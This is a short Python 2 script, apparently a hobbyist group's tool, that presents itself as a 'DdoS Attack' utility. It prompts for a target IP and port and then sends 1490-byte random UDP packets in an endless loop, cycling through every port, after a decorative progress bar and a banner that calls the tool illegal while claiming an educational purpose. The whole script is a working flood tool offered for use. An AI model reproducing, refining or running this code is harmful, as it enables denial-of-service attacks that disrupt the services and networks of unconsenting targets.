print ("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet SYNC")
print
print "Coded By : AHMAD KASHU"
print "Author   : TEAM SYNC"
print "Github   : github.com/T3AmSyNc"
print "Telegram : t.me/T3aMsYnC"
print "FOR JOINING OUR TEAM YOU HAVE TO BE A LEGAL PERSON JOIN OUR TELEGRAM CHANNEL"
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems ONLY TEAM SYNC USERS CAN USE IT LEGALLY"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack")
print(" Team : TEAM SYNC ON TOP ")
print ("\033[92m")
print "[TEAM                    ] 0% "
time.sleep(5)
print "[SYNC =====               ] 25%"
time.sleep(5)
print "[ON ==========          ] 50%"
time.sleep(5)
print "[TOP ===============     ] 75%"
time.sleep(5)
print "[LEMME START====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sended %s packet to %s via port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

